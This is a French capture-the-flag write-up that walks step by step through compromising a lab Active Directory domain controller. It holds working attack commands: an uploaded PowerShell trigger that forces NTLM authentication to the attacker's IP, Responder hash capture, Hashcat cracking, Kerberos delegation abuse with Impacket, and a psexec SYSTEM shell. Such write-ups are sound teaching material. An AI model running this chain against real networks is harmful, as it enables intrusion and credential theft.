
# 1. Reconnaissance réseau

Cible :

```text
10.130.164.95
```

## Scan initial

```bash
nmap -sC -sV 10.130.164.95
```

### Options

- `nmap` : scanner réseau permettant de découvrir les ports et services exposés.
- `-sC` : exécute les scripts NSE par défaut de Nmap.
- `-sV` : détecte les services et leurs versions.
- `10.130.164.95` : adresse IP cible.

Puis scan de tous les ports TCP :

```bash
nmap -Pn -p- --min-rate 3000 -T4 10.130.164.95
```

### Options

- `-Pn` : considère la machine comme active sans dépendre d'un ping ICMP.
- `-p-` : scanne les 65 535 ports TCP.
- `--min-rate 3000` : tente d'envoyer au moins 3000 paquets par seconde.
- `-T4` : augmente la vitesse du scan, adapté à un lab.

Ports principaux :

```text
53     DNS
88     Kerberos
135    RPC
139    NetBIOS
389    LDAP
445    SMB
464    Kerberos password
593    RPC over HTTP
636    LDAPS
3268   Global Catalog LDAP
3269   Global Catalog LDAPS
3389   RDP
9389   AD Web Services
```

Nmap révèle également :

```text
Domain: ctf.local
Hostname: DC01
FQDN: DC01.ctf.local
```

La combinaison :

```text
Kerberos + LDAP + SMB + Global Catalog
```

est caractéristique d'un **Domain Controller Active Directory**.

## Résolution locale

```bash
echo '10.130.164.95 DC01.ctf.local DC01 ctf.local' >> /etc/hosts
```

### Explication

`/etc/hosts` associe localement des noms DNS à une adresse IP.

Ici :

```text
DC01.ctf.local → 10.130.164.95
```

C'est particulièrement important avec Kerberos, qui utilise beaucoup les noms de machines et les SPN plutôt que de simples adresses IP.



# 2. Énumération Active Directory sans credentials

## LDAP

**LDAP — Lightweight Directory Access Protocol** est un protocole permettant d'interroger un annuaire.

Dans Active Directory, LDAP permet notamment de rechercher :

```text
Users
Groups
Computers
Service Accounts
SPN
Attributs Kerberos
...
```

Ports principaux :

```text
389/TCP → LDAP
636/TCP → LDAPS, LDAP chiffré avec TLS
```

Active Directory peut être vu comme un arbre :

```text
DC=ctf,DC=local
├── Users
├── Computers
├── Groups
└── ...
```



## RootDSE

Le **RootDSE — Root Directory Service Entry** est une entrée spéciale située à la racine du serveur LDAP.

Elle donne des informations générales sur l'annuaire :

```text
Domaines hébergés
Naming Contexts
Capabilities LDAP
Partitions AD
Base DN
```

On l'interroge :

```bash
ldapsearch -x -H ldap://DC01.ctf.local -s base namingContexts
```

### Options

- `ldapsearch` : client en ligne de commande pour interroger LDAP.
- `-x` : utilise une authentification LDAP simple plutôt que SASL.
- `-H` : indique l'URI du serveur LDAP.
- `ldap://DC01.ctf.local` : connexion LDAP au DC.
- `-s base` : limite la recherche à l'objet racine, donc au RootDSE.
- `namingContexts` : attribut que l'on veut récupérer.

Résultat :

```text
namingContexts: DC=ctf,DC=local
```

La Base DN du domaine est donc :

```text
DC=ctf,DC=local
```

### Pourquoi commencer par RootDSE ?

Avant d'interroger l'annuaire, il faut savoir où commence l'arbre du domaine.

```text
Serveur LDAP
    ↓
RootDSE
    ↓
DC=ctf,DC=local
    ↓
requêtes sur Users / Groups / Computers / ...
```



## RPC

**RPC — Remote Procedure Call** permet à un programme d'exécuter ou demander des opérations sur une machine distante.

Windows utilise énormément RPC pour :

```text
gestion des utilisateurs
gestion des groupes
services
SAM
administration distante
Active Directory
```

`rpcclient` est un client Samba permettant d'interroger certaines interfaces RPC Windows.

Test d'une **null session** :

```bash
rpcclient -U "" -N DC01.ctf.local
```

### Options

- `rpcclient` : client RPC de Samba.
- `-U ""` : utilisateur vide.
- `-N` : ne demande aucun mot de passe.
- `DC01.ctf.local` : serveur cible.

Une **null session** correspond donc à une tentative de connexion sans véritables credentials.

Dans `rpcclient` :

```text
enumdomusers
enumdomgroups
```

- `enumdomusers` : tente d'énumérer les utilisateurs du domaine.
- `enumdomgroups` : tente d'énumérer les groupes.

Résultat :

```text
NT_STATUS_ACCESS_DENIED
```

La connexion RPC anonyme est possible, mais l'énumération des utilisateurs et groupes est interdite.



# 3. Énumération SMB

**SMB — Server Message Block** est le protocole Windows utilisé principalement pour :

```text
partages de fichiers
partages d'imprimantes
administration distante
IPC
```

Port moderne principal :

```text
445/TCP
```

## Lister les partages

```bash
smbclient -L //DC01.ctf.local -N
```

### Options

- `smbclient` : client SMB en ligne de commande.
- `-L` : liste les partages disponibles.
- `//DC01.ctf.local` : serveur cible.
- `-N` : aucune demande de mot de passe.

Résultat :

```text
ADMIN$
C$
IPC$
IT-Shared
NETLOGON
SYSVOL
```

Partages standards :

```text
ADMIN$   → administration distante
C$       → disque C:
IPC$     → communications inter-processus
NETLOGON → scripts et éléments de connexion du domaine
SYSVOL   → GPO et fichiers répliqués du domaine
```

Partage personnalisé :

```text
IT-Shared
```



## Se connecter au partage

```bash
smbclient //DC01.ctf.local/IT-Shared -N
```

Puis :

```text
ls


Résultat :

IT-Credentials-Backup.txt
IT-Onboarding-Checklist.txt
IT-Portal.html


Téléchargement :

get IT-Credentials-Backup.txt
get IT-Onboarding-Checklist.txt
get IT-Portal.html
```


Puis sous Linux :

```bash
cat IT-Credentials-Backup.txt
cat IT-Onboarding-Checklist.txt
cat IT-Portal.html
```





# 4. Découverte de `svc.scanner`

Le fichier d'onboarding révèle :

```text
File Scanner (svc.scanner)

Runs every 2 minutes.
Enumerates IT-Shared for new files to process.
Uses Shell enumeration to inspect file metadata and icons.
```

Le portail confirme :

```text
Logged in as: svc.scanner
```

`svc.scanner` est un **service account**, c'est-à-dire un compte AD utilisé pour exécuter automatiquement un service ou une tâche.

Le point intéressant est :

```text
Utilisateur anonyme
      ↓
IT-Shared
      ↓
fichier contrôlé par nous
      ↓
traitement automatique
      ↓
svc.scanner
```

Nous contrôlons donc une donnée consommée par un processus exécuté sous une identité AD.



# 5. Vérification des droits d'écriture

Création d'un fichier :

```bash
echo "test" > /tmp/test.txt
```

### Explication

- `echo "test"` : produit le texte `test`.
- `>` : redirige cette sortie vers un fichier.
- `/tmp/test.txt` : fichier créé.

Connexion SMB :

```bash
smbclient //DC01.ctf.local/IT-Shared -N
```

Upload :

```text
put /tmp/test.txt test.txt
```

Nous avons donc :

```text
Lecture anonyme  : OUI
Écriture anonyme : OUI
```

C'est la vulnérabilité initiale essentielle.



# 6. Forcer une authentification NTLM de `svc.scanner`

L'objectif est de faire en sorte que `svc.scanner` contacte notre AttackBox via SMB.

## Création d'un fichier PowerShell

```bash
cat > trigger.ps1 <<'EOF'
Test-Path \\10.130.93.234\icons\icon.ico
EOF
```

### Explication de la commande Bash

```text
cat > trigger.ps1
```

crée le fichier `trigger.ps1`.

```text
<<'EOF'
...
EOF
```

est un **here-document** : tout ce qui se trouve entre les deux `EOF` est écrit dans le fichier.

Contenu PowerShell :

```powershell
Test-Path \\10.130.93.234\icons\icon.ico
```

### `Test-Path`

`Test-Path` est une cmdlet PowerShell permettant de vérifier si un chemin existe.

Ici le chemin est :

```text
\\10.130.93.234\icons\icon.ico

Format :
\\serveur\partage\fichier
```



# 7. Préparation de Responder

**Responder** est un outil permettant notamment de capturer des authentifications NTLM lorsqu'une machine Windows tente de s'authentifier vers la machine attaquante.

Pour recevoir notre connexion SMB, Responder doit écouter sur :

```text
445/TCP
```

## Vérifier les ports

```bash
ss -ltnp | grep -E ':445|:139'
```

### Options

`ss` affiche les sockets réseau.

- `-l` : sockets en écoute.
- `-t` : TCP.
- `-n` : affiche les numéros de ports sans résolution de noms.
- `-p` : affiche le processus associé.

`grep -E ':445|:139'` filtre uniquement les ports SMB/NetBIOS.

Résultat :

```text
smbd
```

Le serveur Samba local occupe déjà le port 445.

On l'arrête :

```bash
systemctl stop smbd
```

- `systemctl` : contrôle les services gérés par systemd.
- `stop smbd` : arrête le service Samba.

Puis lancement de Responder :

```bash
responder -I ens5 -v
```

### Options

- `responder` : lance Responder.
- `-I ens5` : utilise l'interface réseau `ens5`.
- `-v` : mode verbose.

Le serveur SMB de Responder doit maintenant écouter sur `445/TCP`.



# 8. Déclenchement

Connexion au partage :

```bash
smbclient //DC01.ctf.local/IT-Shared -N
```

Upload :

```text
put trigger.ps1 trigger.ps1
exit
```

Chaîne :

```text
trigger.ps1
    ↓
svc.scanner le traite
    ↓
PowerShell exécute Test-Path
    ↓
connexion vers \\10.130.93.234\
    ↓
SMB / TCP 445
    ↓
authentification NTLM
    ↓
Responder
```

Responder capture :

```text
[SMB] NTLMv2-SSP Client   : 10.130.164.95
[SMB] NTLMv2-SSP Username : CTF\svc.scanner
[SMB] NTLMv2-SSP Hash     : svc.scanner::CTF:...
```



# 9. NTLM et NetNTLMv2

**NTLM** est un protocole d'authentification Windows basé sur un mécanisme de **challenge-response**.

Le mot de passe n'est pas directement envoyé sur le réseau.

Schéma simplifié :

```text
Responder
    ↓
envoie un challenge
    ↓
svc.scanner
    ↓
calcule une réponse avec son secret
    ↓
Responder récupère la réponse
```

Nous récupérons donc une **capture NetNTLMv2**, et non :

```text
le mot de passe
ou
le NT hash directement
```

Si le mot de passe est faible, cette capture peut être attaquée hors ligne.

---

# 10. Cracking avec Hashcat


Commande :

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Options

- `hashcat` : lance Hashcat.
- `-m 5600` : indique que le format est NetNTLMv2.
- `hash.txt` : fichier contenant la capture.
- `/usr/share/wordlists/rockyou.txt` : wordlist contenant des mots de passe candidats.

Résultat :

```bash
svc.scanner : 1summerlove!

Afficher un résultat déjà cracké :

hashcat -m 5600 hash.txt --show
```

- `--show` : affiche les mots de passe déjà retrouvés dans le potfile Hashcat.



# 11. Vérification des credentials

**NetExec (`nxc`)** est un outil d'énumération et de validation d'accès sur des environnements Windows/AD.

```bash
nxc smb DC01.ctf.local \
-u 'svc.scanner' \
-p '1summerlove!'
```

### Options

- `nxc` : NetExec.
- `smb` : protocole à utiliser.
- `DC01.ctf.local` : cible.
- `-u` : username.
- `-p` : password.

Résultat :

```text
[+] ctf.local\svc.scanner:1summerlove!
```

Nous possédons donc de vrais credentials :

```text
CTF\svc.scanner
1summerlove!
```



# 12. Énumération LDAP authentifiée

Avec les credentials obtenus, on peut maintenant lire davantage d'attributs AD.

```bash
ldapsearch -x \
-H ldap://DC01.ctf.local \
-D 'svc.scanner@ctf.local' \
-w '1summerlove!' \
-b 'DC=ctf,DC=local' \
'(sAMAccountName=svc.scanner)' \
sAMAccountName memberOf userAccountControl servicePrincipalName msDS-AllowedToDelegateTo
```

### Options

- `-x` : authentification LDAP simple.
- `-H` : serveur LDAP.
- `-D` : Bind DN / identité utilisée pour s'authentifier.
- `-w` : mot de passe.
- `-b` : Base DN à partir de laquelle chercher.
- `(sAMAccountName=svc.scanner)` : filtre LDAP.
- les derniers éléments : attributs que l'on veut récupérer.



```text
Attributs intéressants :
sAMAccountName


Nom de connexion AD :
memberOf


Groupes dont l'utilisateur est membre :
userAccountControl


Flags contrôlant certaines propriétés du compte :
servicePrincipalName


SPN associés au compte :
msDS-AllowedToDelegateTo
```

Services vers lesquels le compte est autorisé à déléguer.

Résultat :

```text
servicePrincipalName: scanner/DC01
servicePrincipalName: scanner/DC01.ctf.local

msDS-AllowedToDelegateTo: cifs/DC01
msDS-AllowedToDelegateTo: cifs/DC01.ctf.local
```

Cela révèle une **Kerberos Constrained Delegation**.



# 13. SPN, CIFS et Kerberos Constrained Delegation

## SPN

**SPN — Service Principal Name** identifie de façon unique un service dans Kerberos.

Exemple :

```text
cifs/DC01.ctf.local
```

signifie :

```text
service : CIFS
machine : DC01.ctf.local
```

## CIFS

**CIFS — Common Internet File System** correspond ici au service Kerberos utilisé pour les accès SMB.

Donc :

```text
cifs/DC01.ctf.local
```

représente le service SMB de DC01.



## Kerberos Constrained Delegation

La **Constrained Delegation** autorise un compte de service à agir au nom d'un utilisateur, mais seulement vers certains services définis.

Ici :

```text
svc.scanner
    ↓
peut déléguer vers
    ↓
cifs/DC01.ctf.local
```

Deux mécanismes Kerberos sont utilisés :

```text
S4U2Self
S4U2Proxy
```

### S4U2Self

Permet à un service de demander un ticket représentant un utilisateur.

Ici :

```text
svc.scanner
    ↓
demande à représenter
    ↓
Administrator
```

### S4U2Proxy

Permet ensuite au service de demander un ticket pour accéder à un service autorisé au nom de cet utilisateur.

Ici :

```text
Administrator
    ↓
cifs/DC01.ctf.local
```

Nous pouvons donc obtenir un ticket CIFS valide au nom d'Administrator sans connaître son mot de passe.



# 14. Obtenir le ticket Administrator

**Impacket** est une collection d'outils Python permettant d'interagir avec de nombreux protocoles Windows/Active Directory.

`getST.py` permet notamment de demander un **Service Ticket Kerberos**.

Vérification :

```bash
which getST.py

Résultat :
/usr/local/pyenv/shims/getST.py
```

Commande :

```bash
getST.py \
-dc-ip 10.130.164.95 \
-spn cifs/DC01.ctf.local \
-impersonate Administrator \
'ctf.local/svc.scanner:1summerlove!'
```

### Options

- `getST.py` : demande un Service Ticket Kerberos.
- `-dc-ip 10.130.164.95` : adresse IP du Domain Controller/KDC.
- `-spn cifs/DC01.ctf.local` : service auquel on veut accéder.
- `-impersonate Administrator` : utilisateur que l'on veut représenter.
- `'ctf.local/svc.scanner:1summerlove!'` : credentials du compte possédant le droit de délégation.

Résultat :

```text
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

Le fichier `.ccache` contient le ticket Kerberos.



# 15. Charger le ticket Kerberos

```bash
export KRB5CCNAME="$PWD/Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache"
```

### Explication

- `export` : crée une variable d'environnement disponible pour les programmes lancés ensuite.
- `KRB5CCNAME` : variable utilisée par Kerberos pour savoir quel cache de tickets utiliser.
- `$PWD` : chemin du dossier courant.

Nous avons maintenant :

```text
mot de passe Administrator : NON
ticket Kerberos valide      : OUI
```



# 16. Exécution distante avec PsExec

## PsExec

**PsExec** est une technique permettant d'exécuter des commandes à distance sur Windows avec des privilèges administratifs.

`psexec.py` est l'implémentation Impacket de cette technique.

Il utilise notamment :

```text
SMB
ADMIN$
Service Control Manager
service Windows temporaire
```

Commande :

```bash
psexec.py -k -no-pass 'ctf.local/Administrator@DC01.ctf.local'
```

### Options

- `psexec.py` : outil Impacket d'exécution distante.
- `-k` : utilise Kerberos.
- `-no-pass` : ne demande aucun mot de passe ; utilise le ticket déjà chargé.
- `ctf.local/Administrator` : identité utilisée.
- `@DC01.ctf.local` : machine cible.

Il faut utiliser :

```text
DC01.ctf.local
```

et non uniquement l'IP, car notre ticket a été créé pour le SPN :

```text
cifs/DC01.ctf.local
```

Kerberos dépend fortement de la correspondance entre le hostname et le SPN.

Le Domain Controller est compromis.

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

# Chaîne d'attaque complète

```text
Nmap
  ↓
DC01.ctf.local / ctf.local
  ↓
LDAP RootDSE
  ↓
SMB null session
  ↓
IT-Shared accessible anonymement
  ↓
IT-Shared writable anonymement
  ↓
documentation interne
  ↓
svc.scanner traite automatiquement les fichiers
  ↓
upload trigger.ps1
  ↓
Test-Path vers \\ATTACKER_IP\
  ↓
authentification SMB de svc.scanner
  ↓
Responder
  ↓
NetNTLMv2
  ↓
Hashcat -m 5600
  ↓
svc.scanner : 1summerlove!
  ↓
LDAP authenticated enumeration
  ↓
msDS-AllowedToDelegateTo = cifs/DC01
  ↓
Kerberos Constrained Delegation
  ↓
S4U2Self
  ↓
S4U2Proxy
  ↓
ticket CIFS Administrator
  ↓
psexec.py -k -no-pass
  ↓
NT AUTHORITY\SYSTEM
  ↓
Administrator flag
```